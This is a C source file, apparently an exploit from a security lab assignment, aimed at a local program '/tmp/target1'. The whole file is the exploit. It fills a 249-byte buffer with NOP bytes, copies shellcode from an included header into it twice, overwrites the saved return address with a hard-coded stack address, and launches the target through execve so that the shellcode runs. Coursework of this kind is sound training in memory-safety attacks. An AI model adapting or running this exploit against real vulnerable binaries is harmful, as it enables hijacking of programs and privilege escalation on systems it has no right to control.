#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET 		"/tmp/target1"
#define NOP 		0x90
#define BUFFER_SIZE	248


int main(void)
{
  char *args[3];
  char *env[1];
  char buff[249];  
  int i;
  char new_return_adr[] = "\xf6\xfe\xff\xbf";
  
  for (i = 0; i < 248; i++) {
    buff[i] = NOP;
  }

  for (i = 0; i < strlen(shellcode); i++) {
    buff[i] = shellcode[i];
  }

  for (i = 0; i < strlen(shellcode); i++) {
    buff[i + 195] = shellcode[i];
  }

  for (i = 0; i < strlen(new_return_adr); i++) {
    buff[i + 195 + 45 + 4] = new_return_adr[i];
  }
  buff[248] = '\0';
    
  args[0] = TARGET; args[1] = buff; args[2] = NULL;
  env[0] = NULL;
  
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
